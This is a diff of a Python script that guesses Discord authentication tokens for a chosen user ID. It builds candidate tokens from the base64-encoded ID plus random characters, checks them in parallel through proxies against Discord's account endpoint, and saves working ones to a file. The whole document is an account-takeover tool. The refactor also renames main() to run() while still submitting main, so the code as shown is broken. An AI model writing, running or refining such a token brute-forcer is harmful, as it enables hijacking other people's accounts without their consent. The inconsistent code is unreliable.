@@ -4,6 +4,7 @@ import base64
 from concurrent.futures import ThreadPoolExecutor
 from colorama import Fore
 
+
 def getproxies():
     """Proxies"""
     with open("./proxies.txt" , encoding="utf-8") as f:
@@ -21,17 +22,7 @@ def randstr(length):
     chars = '-_1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
     return ''.join([random.choice(chars) for _ in range(length)])
 
-
-thd = int(input(f"{Fore.GREEN}[?] すれっど数 > "))
-amnt = int(input(f"{Fore.GREEN}[?] 実行回数 > "))
-usid = input(f"{Fore.GREEN}[?] ユーザーID > ")
-base = base64.b64encode(usid.encode()).decode() + "."
-if int(usid) > 970000000000000000:
-    usi = 38
-else:
-    usi = 27
-
-def main():
+def run():
     token = base + randstr(6) + "." + randstr(usi)
     client = httpx.Client(proxies=getproxies())
     headers = {
@@ -55,7 +46,7 @@ def main():
         res = client.get("https://discord.com/api/v9/users/@me/library?country_code=JP", headers=headers)
         if res.status_code == 200:
             print(f"{Fore.BLUE}[+] Vaild token - {token}")
-            with open("/validtokens.txt", "a+") as f:
+            with open("/validtokens.txt", "a+", encoding="utf-8") as f:
                 f.write(f"{token}\n")
         elif res.status_code == 403 and "message" in res.json():
             print(f"{Fore.RED}[-] Locked token - {token}")
@@ -67,6 +58,16 @@ def main():
         print(f"{Fore.RED}[-] Error - {token}\n{err}")
     
 
-with ThreadPoolExecutor(max_workers=thd) as executor:
-    for i in range(int(amnt)):
-        executor.submit(main)
+
+if __name__ == "__main__":
+    thd = int(input(f"{Fore.GREEN}[?] すれっど数 > "))
+    amnt = int(input(f"{Fore.GREEN}[?] 実行回数 > "))
+    usid = input(f"{Fore.GREEN}[?] ユーザーID > ")
+    base = base64.b64encode(usid.encode()).decode() + "."
+    if int(usid) > 970000000000000000:
+        usi = 38
+    else:
+        usi = 27
+    with ThreadPoolExecutor(max_workers=thd) as executor:
+        for i in range(int(amnt)):
+            executor.submit(main)
